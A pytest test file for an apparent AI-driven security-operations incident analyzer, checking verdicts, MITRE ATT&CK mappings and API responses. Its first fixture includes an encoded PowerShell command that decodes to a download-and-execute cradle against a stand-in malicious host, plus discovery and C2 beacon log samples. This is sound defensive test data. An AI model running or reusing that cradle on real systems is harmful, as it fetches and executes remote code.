from datetime import datetime
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.agents.incident_analyzer import IncidentAnalyzer
from app.agents.multi_agent_pipeline import MultiAgentPipeline
from app.models.incident import FlaggedLog, Incident

client = TestClient(app)


def test_incident_analyzer_malicious_correlation():
    """Verify IncidentAnalyzer correlates flagged process and network logs into a comprehensive MALICIOUS report."""
    incident = Incident(
        incident_id="INC-2026-001",
        title="Suspicious Encoded PowerShell with Outbound Beaconing",
        severity="critical",
        rule_name="PowerShell.ObfuscatedPayload.Beacon",
        timestamp=datetime.fromisoformat("2026-10-06T22:30:00+00:00"),
        description="PowerShell executed with Base64 encoded payload and outbound socket established.",
        flagged_logs=[
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:30:05+00:00"),
                event_type="process",
                host="FINANCE-WS01",
                user="corp\\aditya",
                data={
                    "process_name": "powershell.exe",
                    "process_id": 5820,
                    "parent_process_id": 1040,
                    "parent_process_name": "explorer.exe",
                    "command_line": "powershell.exe -NoP -NonI -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBiAGUAYQBjAG8AbgAnACkA",
                },
            ),
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:30:15+00:00"),
                event_type="process",
                host="FINANCE-WS01",
                user="corp\\aditya",
                data={
                    "process_name": "whoami.exe",
                    "process_id": 5910,
                    "parent_process_id": 5820,
                    "parent_process_name": "powershell.exe",
                    "command_line": "whoami /all",
                },
            ),
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:30:25+00:00"),
                event_type="network",
                host="FINANCE-WS01",
                user="corp\\aditya",
                data={
                    "process_id": 5820,
                    "process_name": "powershell.exe",
                    "source_ip": "10.0.4.15",
                    "destination_ip": "198.51.100.23",
                    "destination_port": 443,
                    "protocol": "TCP",
                    "domain": "malicious.site",
                },
            ),
        ],
    )

    analyzer = IncidentAnalyzer()
    report = analyzer._analyze_deterministic(incident)

    assert report.incident_id == "INC-2026-001"
    assert report.verdict == "MALICIOUS"
    assert report.confidence >= 0.90
    assert report.severity in ["CRITICAL", "HIGH"]
    assert len(report.attack_timeline) == 3
    
    # Verify MITRE ATT&CK techniques
    technique_ids = [m.technique_id for m in report.mitre_attack]
    assert "T1059.001" in technique_ids  # PowerShell
    assert "T1027" in technique_ids      # Obfuscated Files
    assert "T1033" in technique_ids      # System Discovery
    assert "T1071.001" in technique_ids  # C2 Web Protocols

    # Verify Affected Entities
    assert "FINANCE-WS01" in report.affected_entities.hosts
    assert "corp\\aditya" in report.affected_entities.users
    assert 5820 in report.affected_entities.suspicious_pids
    assert "198.51.100.23" in report.affected_entities.ioc_ips
    assert "malicious.site" in report.affected_entities.ioc_domains

    # Verify Recommended Actions
    assert any("Isolate" in action for action in report.recommended_actions)
    assert any("5820" in action for action in report.recommended_actions)
    assert any("198.51.100.23" in action for action in report.recommended_actions)


def test_multi_agent_pipeline_execution():
    """Verify MultiAgentPipeline coordinates the 3 collaborative agents end-to-end."""
    incident = Incident(
        incident_id="INC-PIPELINE-001",
        title="Multi-Agent Pipeline Test",
        severity="high",
        rule_name="PowerShell.Obfuscated",
        flagged_logs=[
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:30:05+00:00"),
                event_type="process",
                host="HOST-01",
                data={"process_name": "powershell.exe", "process_id": 9999, "command_line": "powershell.exe -enc AAAAA"},
            ),
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:30:25+00:00"),
                event_type="network",
                host="HOST-01",
                data={"process_id": 9999, "destination_ip": "1.2.3.4", "destination_port": 80, "domain": "c2.test"},
            ),
        ],
    )

    pipeline = MultiAgentPipeline()
    report = pipeline.analyze(incident)

    assert report.incident_id == "INC-PIPELINE-001"
    assert report.verdict == "MALICIOUS"
    assert len(report.attack_timeline) == 2
    assert "1.2.3.4" in report.affected_entities.ioc_ips
    assert "c2.test" in report.affected_entities.ioc_domains
    assert len(report.mitre_attack) > 0
    assert len(report.recommended_actions) > 0


def test_incident_analyzer_empty_logs():
    """Verify IncidentAnalyzer handles empty incident bundle with INCONCLUSIVE verdict."""
    incident = Incident(
        incident_id="INC-EMPTY-001",
        title="Empty Alert",
        severity="low",
        rule_name="GenericRule",
        flagged_logs=[],
    )

    analyzer = IncidentAnalyzer()
    report = analyzer._analyze_deterministic(incident)

    assert report.incident_id == "INC-EMPTY-001"
    assert report.verdict == "INCONCLUSIVE"
    assert len(report.attack_timeline) == 0


def test_api_incident_analyze_endpoint():
    """Verify POST /api/v1/incidents/analyze returns HTTP 200 with full IncidentReport."""
    payload = {
        "incident_id": "INC-API-001",
        "title": "API Test Incident",
        "severity": "high",
        "rule_name": "Suspicious.Execution",
        "flagged_logs": [
            {
                "timestamp": "2026-10-06T22:30:00Z",
                "event_type": "process",
                "host": "SERVER-01",
                "user": "SYSTEM",
                "data": {
                    "process_name": "powershell.exe",
                    "process_id": 4040,
                    "command_line": "powershell.exe -enc AAAA",
                },
            },
            {
                "timestamp": "2026-10-06T22:30:10Z",
                "event_type": "network",
                "host": "SERVER-01",
                "user": "SYSTEM",
                "data": {
                    "process_id": 4040,
                    "destination_ip": "203.0.113.5",
                    "destination_port": 8443,
                    "domain": "c2.evil.com",
                },
            },
        ],
    }

    response = client.post("/api/v1/incidents/analyze", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["incident_id"] == "INC-API-001"
    assert data["verdict"] == "MALICIOUS"
    assert "attack_timeline" in data
    assert len(data["attack_timeline"]) == 2
    assert "c2.evil.com" in data["affected_entities"]["ioc_domains"]


def test_dashboard_endpoint():
    """Verify GET /dashboard returns HTTP 200 with HTML content."""
    response = client.get("/dashboard")
    assert response.status_code == 200
    assert "text/html" in response.headers["content-type"]
    assert "AGENTIC SOC" in response.text
